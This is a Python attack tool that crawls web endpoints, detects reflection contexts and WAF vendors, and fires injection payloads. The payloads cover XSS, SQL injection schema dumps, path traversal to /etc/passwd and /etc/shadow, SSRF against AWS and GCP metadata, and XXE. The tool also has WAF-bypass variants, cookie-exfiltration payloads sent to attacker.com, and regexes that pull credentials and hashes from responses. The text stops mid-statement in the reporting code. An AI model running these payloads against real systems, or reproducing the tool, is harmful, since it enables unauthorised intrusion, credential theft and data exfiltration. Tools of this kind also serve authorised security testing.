#!/usr/bin/env python3
"""
Context-Aware Payload Mutator v2.0
------------------------------------
Crawls endpoints, fires context-specific payloads,
confirms execution, and extracts real data from successful hits.
"""

import re
import sys
import json
import time
import argparse
import urllib.parse
import html
from typing import Optional
from dataclasses import dataclass, field

try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("Missing deps. Run: pip install requests colorama")
    sys.exit(1)


# ──────────────────────────────────────────────
#  Data Structures
# ──────────────────────────────────────────────

@dataclass
class Context:
    name: str
    description: str
    confidence: float

@dataclass
class Payload:
    raw: str
    context: str
    encoding: str
    bypass_type: str
    risk: str
    notes: str = ""
    vuln_type: str = ""

@dataclass
class FireResult:
    """Result of actually sending a payload to an endpoint."""
    endpoint: str
    parameter: str
    method: str
    payload: Payload
    status_code: int
    response_time: float
    confirmed: bool
    evidence: str
    extracted_data: str
    response_snippet: str
    full_url: str

@dataclass
class EndpointResult:
    url: str
    parameter: str
    method: str
    contexts: list = field(default_factory=list)
    waf_detected: bool = False
    waf_vendor: str = ""
    fire_results: list = field(default_factory=list)


# ──────────────────────────────────────────────
#  Endpoint Crawler
# ──────────────────────────────────────────────

class EndpointCrawler:
    COMMON_PARAMS = [
        "q", "s", "search", "query", "input", "id", "page", "url", "path",
        "file", "name", "user", "username", "email", "redirect", "next",
        "return", "ref", "src", "dest", "target", "data", "content", "text",
        "msg", "message", "comment", "lang", "format", "type", "action",
        "cmd", "load", "include", "template", "view", "cat", "filter",
        "callback", "jsonp", "token", "key", "api_key",
    ]

    COMMON_PATHS = [
        "", "/search", "/api/search", "/api/v1/search",
        "/login", "/register", "/api/login",
        "/profile", "/user", "/account",
        "/api/user", "/api/v1/user",
        "/admin", "/admin/login",
        "/api/data", "/api/v1/data",
        "/include", "/load", "/page",
    ]

    def __init__(self, session, timeout=10, delay=0.3):
        self.session = session
        self.timeout = timeout
        self.delay = delay

    def discover(self, base_url: str, param: Optional[str],
                 crawl: bool = False) -> list:
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        targets = []

        existing_params = urllib.parse.parse_qs(parsed.query)
        if param:
            targets.append((base_url, param, "GET"))
        elif existing_params:
            for p in existing_params:
                targets.append((base_url, p, "GET"))
        else:
            for p in self.COMMON_PARAMS[:10]:
                targets.append((base_url, p, "GET"))

        if not crawl:
            return targets

        print(f"{Fore.CYAN}[CRAWL] Discovering endpoints on {origin}...")
        found_paths = self._crawl_paths(origin)

        for path_url in found_paths:
            p_parsed = urllib.parse.urlparse(path_url)
            p_qs = urllib.parse.parse_qs(p_parsed.query)
            if p_qs:
                for p in p_qs:
                    targets.append((path_url, p, "GET"))
            else:
                for p in self.COMMON_PARAMS[:6]:
                    targets.append((path_url, p, "GET"))

        seen = set()
        unique = []
        for t in targets:
            key = f"{t[0]}|{t[1]}|{t[2]}"
            if key not in seen:
                seen.add(key)
                unique.append(t)

        print(f"{Fore.CYAN}[CRAWL] {len(unique)} endpoint/parameter combinations to test")
        return unique

    def _crawl_paths(self, origin: str) -> list:
        found = []
        for path in self.COMMON_PATHS:
            url = origin + path
            try:
                r = self.session.get(url, timeout=self.timeout,
                                     verify=False, allow_redirects=False)
                if r.status_code in (200, 301, 302):
                    found.append(url)
                    print(f"  {Fore.GREEN}[{r.status_code}] {url}")
                time.sleep(self.delay)
            except Exception:
                pass
        return found

    def extract_links_and_forms(self, base_url: str) -> list:
        targets = []
        try:
            r = self.session.get(base_url, timeout=10, verify=False)
            body = r.text
            p_parsed = urllib.parse.urlparse(base_url)
            origin = f"{p_parsed.scheme}://{p_parsed.netloc}"

            # Forms
            forms = re.findall(
                r'<form[^>]*action=["\']?([^"\'> ]+)["\']?[^>]*>(.*?)</form>',
                body, re.DOTALL | re.IGNORECASE)
            for action, form_body in forms:
                if not action.startswith("http"):
                    action = origin + action
                method_m = re.search(r'method=["\']?(get|post)["\']?',
                                     form_body, re.IGNORECASE)
                method = method_m.group(1).upper() if method_m else "GET"
                inputs = re.findall(
                    r'<input[^>]*name=["\']?([^"\'> ]+)["\']?',
                    form_body, re.IGNORECASE)
                for inp in inputs:
                    targets.append((action, inp, method))

            # Links with params
            links = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']',
                               body, re.IGNORECASE)
            for link in links:
                if not link.startswith("http"):
                    link = origin + link
                lp = urllib.parse.urlparse(link)
                qs = urllib.parse.parse_qs(lp.query)
                for param in qs:
                    targets.append((link, param, "GET"))

        except Exception as e:
            print(f"{Fore.YELLOW}[!] Link extraction failed: {e}")
        return targets


# ──────────────────────────────────────────────
#  Context Detector
# ──────────────────────────────────────────────

class ContextDetector:
    PROBE = "CXPROBE7731"

    PATTERNS = {
        "html_tag_attribute": [
            r'<[a-z]+[^>]*=\s*["\']?[^"\']*CXPROBE7731',
            r'CXPROBE7731[^"\']*["\']?\s*[a-z]+='
        ],
        "html_between_tags":           [r'>[^<]*CXPROBE7731[^<]*<'],
        "javascript_string_single":    [r"'[^']*CXPROBE7731[^']*'"],
        "javascript_string_double":    [r'"[^"]*CXPROBE7731[^"]*"'],
        "javascript_template_literal": [r'`[^`]*CXPROBE7731[^`]*`'],
        "javascript_unquoted":         [r'=\s*CXPROBE7731\s*[;,\)]'],
        "json_value":                  [r'"[^"]*":\s*"[^"]*CXPROBE7731[^"]*"'],
        "html_comment":                [r'<!--[^>]*CXPROBE7731[^>]*-->'],
        "css_value":                   [r':\s*[^;]*CXPROBE7731[^;]*;'],
        "url_parameter":               [r'[?&]\w+=CXPROBE7731'],
        "sql_error": [
            r"(SQL syntax.*MySQL|mysql_fetch|ORA-\d|syntax error|SQLSTATE|Unclosed quotation)"
        ],
        "xml_tag": [r'<\w+>[^<]*CXPROBE7731[^<]*</\w+>'],
    }

    def detect(self, body: str) -> list:
        contexts = []
        for ctx_name, patterns in self.PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    contexts.append(Context(
                        name=ctx_name,
                        description=self._describe(ctx_name),
                        confidence=0.95 if ctx_name == "sql_error" else 0.90
                    ))
                    break
        if not contexts:
            contexts.append(Context("unknown", "Reflection found but context unclear", 0.3))
        return sorted(contexts, key=lambda c: c.confidence, reverse=True)

    def _describe(self, ctx_name: str) -> str:
        return {
            "html_tag_attribute":          "Reflected inside an HTML tag attribute value",
            "html_between_tags":           "Reflected between HTML tags (innerHTML context)",
            "javascript_string_single":    "Inside a single-quoted JavaScript string",
            "javascript_string_double":    "Inside a double-quoted JavaScript string",
            "javascript_template_literal": "Inside a JS template literal (backtick string)",
            "javascript_unquoted":         "Unquoted JavaScript variable assignment",
            "json_value":                  "Inside a JSON response value",
            "html_comment":                "Inside an HTML comment",
            "css_value":                   "Inside a CSS property value",
            "url_parameter":               "Reflected back as a URL parameter",
            "sql_error":                   "SQL error detected — likely SQL injection point",
            "xml_tag":                     "Inside XML/SOAP tag content",
            "unknown":                     "Unknown reflection context",
        }.get(ctx_name, ctx_name)


# ──────────────────────────────────────────────
#  WAF Detector
# ──────────────────────────────────────────────

class WAFDetector:
    SIGNATURES = {
        "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid"],
        "AWS WAF":     ["x-amzn-requestid", "x-amz-cf-id"],
        "ModSecurity": ["mod_security", "modsecurity", "not acceptable"],
        "Akamai":      ["akamai", "ak_bmsc", "akamaierror"],
        "Imperva":     ["incapsula", "visid_incap", "imperva"],
        "F5 BIG-IP":   ["bigip", "f5-trafficshield"],
        "Barracuda":   ["barracuda", "barra_counter_session"],
        "Sucuri":      ["sucuri", "x-sucuri-id"],
    }

    def detect(self, response) -> tuple:
        combined = (str(response.headers) + response.text).lower()
        for vendor, sigs in self.SIGNATURES.items():
            for sig in sigs:
                if sig in combined:
                    return True, vendor
        if response.status_code in (403, 406, 429):
            return True, "Unknown WAF"
        return False, ""


# ──────────────────────────────────────────────
#  Payload Library
# ──────────────────────────────────────────────

class PayloadLibrary:
    def get_payloads(self, context_name: str, waf_detected: bool) -> list:
        base = self._base_payloads(context_name)
        if waf_detected:
            base += self._bypass_payloads(context_name)
        return base

    def _base_payloads(self, ctx: str) -> list:
        p = {
            "html_between_tags": [
                Payload("<script>alert(document.domain)</script>", ctx, "none", "XSS", "high", "Script tag — confirms domain", "XSS"),
                Payload("<img src=x onerror=alert(document.cookie)>", ctx, "none", "XSS", "high", "Cookie theft via onerror", "XSS"),
                Payload("<svg onload=alert(1)>", ctx, "none", "XSS", "high", "SVG onload", "XSS"),
                Payload("<details open ontoggle=alert(1)>", ctx, "none", "XSS", "medium", "HTML5 details tag", "XSS"),
                Payload("<iframe srcdoc='<script>alert(1)</script>'>", ctx, "none", "XSS", "high", "Iframe srcdoc", "XSS"),
            ],
            "html_tag_attribute": [
                Payload('" onmouseover="alert(document.domain)', ctx, "none", "XSS", "high", "Attribute break + event", "XSS"),
                Payload("' onmouseover='alert(1)", ctx, "none", "XSS", "high", "Single-quote variant", "XSS"),
                Payload('" autofocus onfocus="alert(1)', ctx, "none", "XSS", "high", "No interaction needed", "XSS"),
                Payload('"><script>alert(1)</script>', ctx, "none", "XSS", "high", "Close tag + inject", "XSS"),
                Payload('" style="animation-name:x" onanimationstart="alert(1)', ctx, "none", "XSS", "medium", "CSS animation event", "XSS"),
            ],
            "javascript_string_single": [
                Payload("';alert(document.domain)//", ctx, "none", "XSS", "high", "Break JS string", "XSS"),
                Payload("'-alert(1)-'", ctx, "none", "XSS", "high", "Arithmetic escape", "XSS"),
                Payload("';fetch('https://attacker.com?c='+document.cookie)//", ctx, "none", "XSS", "high", "Cookie exfil", "XSS"),
            ],
            "javascript_string_double": [
                Payload('";alert(document.domain)//', ctx, "none", "XSS", "high", "Break double-quoted JS string", "XSS"),
                Payload('"-alert(1)-"', ctx, "none", "XSS", "high", "Arithmetic escape", "XSS"),
                Payload('";fetch("https://attacker.com?c="+document.cookie)//', ctx, "none", "XSS", "high", "Cookie exfil", "XSS"),
            ],
            "javascript_template_literal": [
                Payload("${alert(document.domain)}", ctx, "none", "XSS", "high", "Template literal injection", "XSS"),
                Payload("${fetch('https://attacker.com?c='+document.cookie)}", ctx, "none", "XSS", "high", "Cookie exfil via template literal", "XSS"),
            ],
            "sql_error": [
                Payload("'", ctx, "none", "SQLi", "high", "Single quote — triggers SQL error", "SQLi"),
                Payload("' OR '1'='1", ctx, "none", "SQLi", "high", "Auth bypass", "SQLi"),
                Payload("' OR 1=1--", ctx, "none", "SQLi", "high", "Comment bypass", "SQLi"),
                Payload("' UNION SELECT null,null,null--", ctx, "none", "SQLi", "high", "Union column detection", "SQLi"),
                Payload("' UNION SELECT 1,2,3--", ctx, "none", "SQLi", "high", "Union data positions", "SQLi"),
                Payload("' UNION SELECT table_name,2,3 FROM information_schema.tables--", ctx, "none", "SQLi", "high", "Dump table names", "SQLi"),
                Payload("' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--", ctx, "none", "SQLi", "high", "Dump columns", "SQLi"),
                Payload("' AND SLEEP(5)--", ctx, "none", "SQLi-Time", "high", "Time-based blind", "SQLi"),
                Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", ctx, "none", "SQLi-Time", "high", "Nested sleep bypass", "SQLi"),
            ],
            "url_parameter": [
                Payload("javascript:alert(1)", ctx, "none", "XSS", "high", "JS protocol", "XSS"),
                Payload("/../../../etc/passwd", ctx, "none", "LFI", "high", "Path traversal — Linux passwd", "LFI"),
                Payload("....//....//....//etc/passwd", ctx, "none", "LFI", "high", "Double-dot bypass", "LFI"),
                Payload("../../../../etc/passwd", ctx, "none", "LFI", "high", "Classic LFI", "LFI"),
                Payload("../../../../etc/shadow", ctx, "none", "LFI", "high", "Shadow file — password hashes", "LFI"),
                Payload("../../../../proc/self/environ", ctx, "none", "LFI", "high", "Process env vars", "LFI"),
                Payload("../../../../var/log/apache2/access.log", ctx, "none", "LFI", "medium", "Apache log read", "LFI"),
                Payload("file:///etc/passwd", ctx, "none", "SSRF/LFI", "high", "File protocol", "SSRF"),
                Payload("http://169.254.169.254/latest/meta-data/", ctx, "none", "SSRF", "high", "AWS EC2 metadata", "SSRF"),
                Payload("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ctx, "none", "SSRF", "high", "AWS IAM credentials", "SSRF"),
                Payload("http://metadata.google.internal/computeMetadata/v1/", ctx, "none", "SSRF", "high", "GCP metadata", "SSRF"),
                Payload("http://localhost:80/admin", ctx, "none", "SSRF", "high", "Internal admin access", "SSRF"),
                Payload("http://127.0.0.1:8080/", ctx, "none", "SSRF", "medium", "Localhost alt port", "SSRF"),
                Payload("dict://127.0.0.1:6379/info", ctx, "none", "SSRF", "high", "Redis info via SSRF", "SSRF"),
            ],
            "xml_tag": [
                Payload("]]><script>alert(1)</script><![CDATA[", ctx, "none", "XSS/XXE", "high", "CDATA break", "XSS"),
                Payload('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx SYSTEM "file:///etc/passwd">]><x>&xx;</x>', ctx, "none", "XXE", "high", "XXE file read — passwd", "XXE"),
                Payload('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx SYSTEM "file:///etc/hosts">]><x>&xx;</x>', ctx, "none", "XXE", "high", "XXE file read — hosts", "XXE"),
            ],
            "json_value": [
                Payload('","x":"<script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON value escape", "XSS"),
                Payload('</script><script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON in HTML script block", "XSS"),
            ],
            "html_comment": [
                Payload("--><script>alert(1)</script><!--", ctx, "none", "XSS", "high", "Break out of comment", "XSS"),
            ],
            "css_value": [
                Payload(");}</style><script>alert(1)</script><style>", ctx, "none", "XSS", "high", "Break out of style block", "XSS"),
            ],
        }
        return p.get(ctx, [
            Payload("<script>alert(1)</script>", ctx, "none", "XSS", "medium", "Generic XSS fallback", "XSS"),
            Payload("' OR '1'='1", ctx, "none", "SQLi", "medium", "Generic SQLi fallback", "SQLi"),
            Payload("/../../../etc/passwd", ctx, "none", "LFI", "medium", "Generic LFI fallback", "LFI"),
        ])

    def _bypass_payloads(self, ctx: str) -> list:
        bypass = {
            "html_between_tags": [
                Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case bypass", "XSS"),
                Payload("<script>eval(atob('YWxlcnQoMSk='))</script>", ctx, "base64", "XSS-WAF-Bypass", "high", "Base64 encoded", "XSS"),
                Payload("<scr<!---->ipt>alert(1)</scr<!---->ipt>", ctx, "comment", "XSS-WAF-Bypass", "medium", "Comment insertion", "XSS"),
            ],
            "html_tag_attribute": [
                Payload('" OnMoUsEoVeR="alert(1)', ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case event", "XSS"),
                Payload('" on\x09mouseover="alert(1)', ctx, "tab", "XSS-WAF-Bypass", "high", "Tab in event name", "XSS"),
            ],
            "sql_error": [
                Payload("' /*!OR*/ '1'='1", ctx, "comment", "SQLi-WAF-Bypass", "high", "MySQL inline comment", "SQLi"),
                Payload("'/**/OR/**/1=1--", ctx, "comment", "SQLi-WAF-Bypass", "high", "Comment space sub", "SQLi"),
                Payload("' %4fR '1'='1", ctx, "url", "SQLi-WAF-Bypass", "high", "URL encoded OR", "SQLi"),
            ],
            "url_parameter": [
                Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", ctx, "url", "LFI-WAF-Bypass", "high", "URL encoded traversal", "LFI"),
                Payload("..%252f..%252f..%252fetc%252fpasswd", ctx, "double_url", "LFI-WAF-Bypass", "high", "Double URL encoded LFI", "LFI"),
                Payload("http://[::1]/admin", ctx, "none", "SSRF-WAF-Bypass", "high", "IPv6 localhost bypass", "SSRF"),
            ],
        }
        return bypass.get(ctx, [
            Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "WAF-Bypass", "medium", "Generic case bypass", "XSS"),
        ])


# ──────────────────────────────────────────────
#  Payload Firing Engine
# ──────────────────────────────────────────────

class PayloadFirer:
    SUCCESS_PATTERNS = {
        "LFI": [
            (r"root:.*:0:0:", "CONFIRMED: /etc/passwd — root entry exposed"),
            (r"daemon:.*:/usr/sbin", "CONFIRMED: /etc/passwd — daemon entry exposed"),
            (r"www-data:.*:/var/www", "CONFIRMED: /etc/passwd — www-data entry"),
            (r"bin:.*:/bin", "CONFIRMED: /etc/passwd content readable"),
            (r"SSH_CLIENT|PATH=|HOME=|USER=|SHELL=", "CONFIRMED: /proc/self/environ — env vars exposed"),
            (r"127\.0\.0\.1\s+localhost", "CONFIRMED: /etc/hosts content readable"),
            (r"\$apr1\$|\$6\$|\$1\$", "CONFIRMED: /etc/shadow — password hashes exposed"),
            (r"GET /.*HTTP/1\.|POST /.*HTTP/1\.", "CONFIRMED: Server log file readable"),
        ],
        "SQLi": [
            (r"SQL syntax.*MySQL|MySQL.*SQL syntax", "CONFIRMED: MySQL SQL syntax error"),
            (r"Warning.*mysql_", "CONFIRMED: MySQL error — mysql_ function exposed"),
            (r"ORA-\d{5}", "CONFIRMED: Oracle database error"),
            (r"Microsoft SQL Server.*\[SQL", "CONFIRMED: MSSQL error exposed"),
            (r"SQLSTATE\[", "CONFIRMED: PDO SQL error"),
            (r"Unclosed quotation mark", "CONFIRMED: MSSQL unclosed quote error"),
            (r"pg_query\(\)|PostgreSQL.*ERROR", "CONFIRMED: PostgreSQL error"),
            (r"SQLite.*exception|sqlite3\.OperationalError", "CONFIRMED: SQLite error"),
            (r"information_schema|TABLE_NAME", "CONFIRMED: Schema data in response"),
        ],
        "SSRF": [
            (r"ami-id|instance-id|local-ipv4", "CONFIRMED: AWS EC2 metadata exposed"),
            (r"AccessKeyId|SecretAccessKey", "CONFIRMED: AWS IAM credentials in response"),
            (r"computeMetadata|gce-metadata", "CONFIRMED: GCP metadata exposed"),
            (r"redis_version|connected_clients", "CONFIRMED: Redis info via SSRF"),
        ],
        "XXE": [
            (r"root:.*:0:0:", "CONFIRMED: /etc/passwd via XXE"),
            (r"127\.0\.0\.1\s+localhost", "CONFIRMED: /etc/hosts via XXE"),
        ],
        "XSS": [
            (r"alert\(document\.domain\)|alert\(1\)", "REFLECTED: XSS payload in response — verify in browser"),
            (r"onerror=alert|onload=alert|onfocus=alert", "REFLECTED: Event handler present in response"),
            (r"<script>.*?alert", "REFLECTED: Script tag with alert in response"),
        ],
    }

    EXTRACT_PATTERNS = {
        "LFI": [
            r"([a-zA-Z0-9_-]+:[x*!\$][:\d]+:[:\d]+:[^:\n]*:[^:\n]*:[^\n]+)",
            r"(root:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^\n]+)",
            r"(SSH_\w+=\S+|PATH=[^\n]+|HOME=[^\n]+|USER=[^\n]+|SHELL=[^\n]+)",
            r"(\d+\.\d+\.\d+\.\d+\s+\S+)",
            r"(\$[a-z0-9]+\$[^\s:]+)",
        ],
        "SQLi": [
            r"((?:MySQL|ORA|MSSQL|PostgreSQL|SQLite).*?(?:error|Error|ERROR)[^\n<]+)",
            r"(SQLSTATE\[[^\]]+\][^\n<]+)",
            r"(TABLE_NAME[^\n<]{10,80})",
            r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
        ],
        "SSRF": [
            r"(ami-id[^\n<]+)",
            r"(instance-id[^\n<]+)",
            r"(local-ipv4[^\n<]+)",
            r"(AccessKeyId[^\n<]+)",
            r"(SecretAccessKey[^\n<]+)",
            r"(redis_version[^\n<]+)",
            r"(connected_clients[^\n<]+)",
        ],
        "XXE": [
            r"([a-zA-Z0-9_-]+:[x*!\$][:\d]+:[:\d]+:[^:\n]*:[^:\n]*:[^\n]+)",
            r"(\d+\.\d+\.\d+\.\d+\s+\S+)",
        ],
    }

    def __init__(self, session, timeout=15, delay=0.5):
        self.session = session
        self.timeout = timeout
        self.delay = delay

    def fire(self, url: str, param: str, method: str, payload: Payload) -> FireResult:
        start = time.time()
        try:
            full_url, response = self._send(url, param, payload.raw, method)
        except Exception as e:
            return FireResult(url, param, method, payload, 0, 0,
                              False, f"Request failed: {e}", "", "", url)

        elapsed = time.time() - start
        time.sleep(self.delay)

        confirmed, evidence, extracted = self._analyze(response.text, payload, elapsed)
        snippet = self._get_snippet(response.text, payload.raw)

        return FireResult(
            endpoint=url, parameter=param, method=method, payload=payload,
            status_code=response.status_code, response_time=elapsed,
            confirmed=confirmed, evidence=evidence, extracted_data=extracted,
            response_snippet=snippet, full_url=full_url
        )

    def _send(self, url: str, param: str, value: str, method: str):
        if method.upper() == "POST":
            r = self.session.post(url, data={param: value},
                                  timeout=self.timeout, verify=False)
            return url, r
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        full_url = parsed._replace(query=new_qs).geturl()
        r = self.session.get(full_url, timeout=self.timeout,
                             verify=False, allow_redirects=True)
        return full_url, r

    def _analyze(self, body: str, payload: Payload, elapsed: float):
        vuln_type = payload.vuln_type or "XSS"

        # Time-based SQLi
        if "SLEEP" in payload.raw or "WAITFOR" in payload.raw:
            if elapsed >= 4.5:
                return (True,
                        f"CONFIRMED: Time-based SQLi — delayed {elapsed:.1f}s (expected ~5s)",
                        "")

        patterns = self.SUCCESS_PATTERNS.get(vuln_type, [])
        for pattern, message in patterns:
            match = re.search(pattern, body, re.IGNORECASE | re.DOTALL)
            if match:
                extracted = self._extract_data(body, vuln_type)
                return True, message, extracted

        return False, "", ""

    def _extract_data(self, body: str, vuln_type: str) -> str:
        patterns = self.EXTRACT_PATTERNS.get(vuln_type, [])
        lines = []
        for pattern in patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            for m in matches[:5]:
                line = (m.strip() if isinstance(m, str)
                        else " ".join(m).strip())
                if line and line not in lines:
                    lines.append(line)
        return "\n".join(lines[:20])

    def _get_snippet(self, body: str, payload_raw: str) -> str:
        idx = body.find(payload_raw[:20])
        if idx == -1:
            idx = body.find(html.escape(payload_raw[:20]))
        if idx == -1:
            return ""
        start = max(0, idx - 80)
        end = min(len(body), idx + 220)
        snippet = re.sub(r'\s+', ' ', body[start:end].strip())
        return snippet[:300]


# ──────────────────────────────────────────────
#  Master Scanner
# ──────────────────────────────────────────────

class PayloadMutator:
    def __init__(self, proxy=None, delay=0.5, timeout=15,
                 headers=None, vuln_filter=None):
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.delay = delay
        self.timeout = timeout
        self.vuln_filter = [v.upper() for v in vuln_filter] if vuln_filter else None

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64; rv:109.0) "
                           "Gecko/20100101 Firefox/115.0"),
            **(headers or {})
        })
        if self.proxy:
            self.session.proxies = self.proxy

        self.detector = ContextDetector()
        self.waf_det  = WAFDetector()
        self.library  = PayloadLibrary()
        self.firer    = PayloadFirer(self.session, timeout=timeout, delay=delay)
        self.crawler  = EndpointCrawler(self.session, timeout=timeout, delay=delay)

    def run(self, url: str, param=None, method="GET",
            crawl=False, fire=True, forms=False) -> list:
        targets = self.crawler.discover(url, param, crawl=crawl)

        if forms:
            print(f"{Fore.CYAN}[*] Extracting forms and links...")
            extra = self.crawler.extract_links_and_forms(url)
            targets += extra
            print(f"{Fore.CYAN}[*] {len(extra)} additional form/link targets found")

        print(f"\n{Fore.CYAN}[*] Testing {len(targets)} endpoint/parameter combination(s)\n")
        results = []
        for ep_url, ep_param, ep_method in targets:
            result = self._scan_endpoint(ep_url, ep_param, ep_method, fire)
            results.append(result)
        return results

    def _scan_endpoint(self, url: str, param: str, method: str, fire: bool):
        result = EndpointResult(url=url, parameter=param, method=method)
        print(f"{Fore.WHITE}[PROBE] {method} {url} → param={param}")

        try:
            _, probe_resp = self.firer._send(url, param, ContextDetector.PROBE, method)
        except Exception as e:
            print(f"  {Fore.RED}[!] Probe failed: {e}")
            return result

        waf_found, waf_vendor = self.waf_det.detect(probe_resp)
        result.waf_detected = waf_found
        result.waf_vendor = waf_vendor
        if waf_found:
            print(f"  {Fore.RED}[WAF] {waf_vendor} — adding bypass payloads")

        probe_reflected = ContextDetector.PROBE in probe_resp.text
        if probe_reflected:
            result.contexts = self.detector.detect(probe_resp.text)
            for ctx in result.contexts[:3]:
                print(f"  {Fore.GREEN}[CTX] {ctx.name} ({ctx.confidence*100:.0f}%)")
        else:
            print(f"  {Fore.YELLOW}[!] Probe not reflected — firing blind payloads anyway")

        if not fire:
            return result

        # Build payload list
        all_payloads = []
        seen_raws = set()
        contexts_to_use = result.contexts if result.contexts else [
            Context("url_parameter", "", 0.5)
        ]

        for ctx in contexts_to_use:
            if ctx.name == "unknown":
                ctx.name = "url_parameter"
            for p in self.library.get_payloads(ctx.name, waf_found):
                if p.raw not in seen_raws:
                    if self.vuln_filter and p.vuln_type.upper() not in self.vuln_filter:
                        continue
                    seen_raws.add(p.raw)
                    all_payloads.append(p)

        print(f"  {Fore.CYAN}[FIRE] Sending {len(all_payloads)} payloads...")

        for payload in all_payloads:
            fr = self.firer.fire(url, param, method, payload)
            result.fire_results.append(fr)
            if fr.confirmed:
                print(f"  {Fore.RED}{Style.BRIGHT}[HIT] {payload.vuln_type} "
                      f"— {fr.evidence[:70]}")

        confirmed = sum(1 for fr in result.fire_results if fr.confirmed)
        print(f"  {Fore.WHITE}[DONE] {confirmed}/{len(all_payloads)} confirmed\n")
        return result


# ──────────────────────────────────────────────
#  Output / Reporting
# ──────────────────────────────────────────────

RISK_COLOR = {"high": Fore.RED, "medium": Fore.YELLOW, "low": Fore.GREEN}

def banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
  ██████╗ █████╗ ██████╗ ███╗   ███╗
 ██╔════╝██╔══██╗██╔══██╗████╗ ████║
 ██║     ███████║██████╔╝██╔████╔██║
 ██║     ██╔══██║██╔═══╝ ██║╚██╔╝██║
 ╚██████╗██║  ██║██║     ██║ ╚═╝ ██║
  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝
{Style.RESET_ALL}{Fore.WHITE}  Context-Aware Payload Mutator  {Fore.CYAN}v2.0
  {Fore.WHITE}Active Firing + Data Extraction Edition
{Style.RESET_ALL}""")


def print_results(all_results: list, output_format: str = "terminal"):
    if output_format == "json":
        out = []
        for r in all_results:
            out.append({
                "url": r.url, "parameter": r.parameter, "method": r.method,
                "waf": r.waf_vendor if r.waf_detected else None,
                "contexts": [{"name": c.name, "confidence": c.confidence}
                             for c in r.contexts],
                "payloads_fired": len(r.fire_results),
                "confirmed_hits": [
                    {
                        "full_url": fr.full_url,
                        "parameter": fr.parameter,
                        "method": fr.method,
                        "payload": fr.payload.raw,
                        "vuln_type": fr.payload.vuln_type,
                        "risk": fr.payload.risk,
                        "status_code": fr.status_code,
                        "response_time_ms": round(fr.response_time * 1000, 1),
                        "evidence": fr.evidence,
                        "extracted_data": fr.extracted_data,
                        "response_snippet": fr.response_snippet,
                    }
                    for fr in r.fire_results if fr.confirmed
                ],
            })
        print(json.dumps(out, indent=2))
        return

    total_confirmed = sum(
        sum(1 for fr in r.fire_results if fr.confirmed)
        for r in all_results
    )

    print(f"\n{Fore.CYAN}{'═'*65}")
    print(f"{Fore.WHITE}{Style.BRIGHT}  SCAN REPORT  —  {total_confirmed} CONFIRMED HIT(S)")
    print(f"{Fore.CYAN}{'═'*65}{Style.RESET_ALL}")

    for ep in all_results:
        confirmed_hits = [fr for fr in ep.fire_results if fr.confirmed]
        all_tried = ep.fire_results
        if not all_tried:
            continue

        print(f"\n{Fore.WHITE}{Style.BRIGHT}  ┌─ ENDPOINT: {Fore.YELLOW}{ep.url}")
        print(f"  {Fore.WHITE}│  Parameter : {Fore.YELLOW}{ep.parameter}   "
              f"Method: {ep.method}")
        if ep.waf_detected:
            print(f"  {Fore.WHITE}│  WAF       : {Fore.RED}⚠  {ep.waf_vendor}")
        if ep.contexts:
            ctx_str = ", ".join(c.name for c in ep.contexts[:4])
            print(f"  {Fore.WHITE}│  Contexts  : {Fore.CYAN}{ctx_str}")
        print(f"  {Fore.WHITE}│  Payloads  : {len(all_tried)} fired — "
              f"{Fore.RED if confirmed_hits else Fore.WHITE}"
              f"{len(confirmed_hits)} confirmed{Style.RESET_ALL}")

        if not confirmed_hits:
            print(f"  {Fore.WHITE}│")
            print(f"  {Fore.YELLOW}│  No confirmed hits. Payloads tried:")
            for fr in all_tried[:6]:
                rc = RISK_COLOR.get(fr.payload.risk, Fore.WHITE)
                print(f"  {Fore.WHITE}│    {rc}[{fr.payload.risk.upper():6s}] "
                      f"{fr.payload.vuln_type:12s} "
                      f"[HTTP {fr.status_code}]  "
                      f"{Fore.WHITE}{fr.payload.raw[:55]}")
            if len(all_tried) > 6:
                print(f"  {Fore.WHITE}│    ... and {len(all_tried)-6} more")
            print(f"  {Fore.WHITE}└{'─'*61}{Style.RESET_ALL}")
            continue

        print(f"  {Fore.WHITE}│")
        print(f"  {Fore.RED}{Style.BRIGHT}│  ▶ CONFIRMED VULNERABILITIES{Style.RESET_ALL}")

        for i, fr in enumerate(confirmed_hits, 1):
            rc = RISK_COLOR.get(fr.payload.risk, Fore.WHITE)
            waf_tag = (f" {Fore.MAGENTA}[WAF-BYPASS]"
                       if "WAF-Bypass" in fr.payload.bypass_type else "")

            print(f"\n  {Fore.WHITE}│  {Style.BRIGHT}[HIT {i:02d}]{waf_tag} "
                  f"{rc}{fr.payload.risk.upper()} — "
                  f"{Fore.CYAN}{fr.payload.vuln_type}{Style.RESET_ALL}")

            print(f"  {Fore.WHITE}│    ▸ Endpoint    : {Fore.GREEN}{fr.full_url}")
            print(f"  {Fore.WHITE}│    ▸ Parameter   : {Fore.YELLOW}{fr.parameter}  "
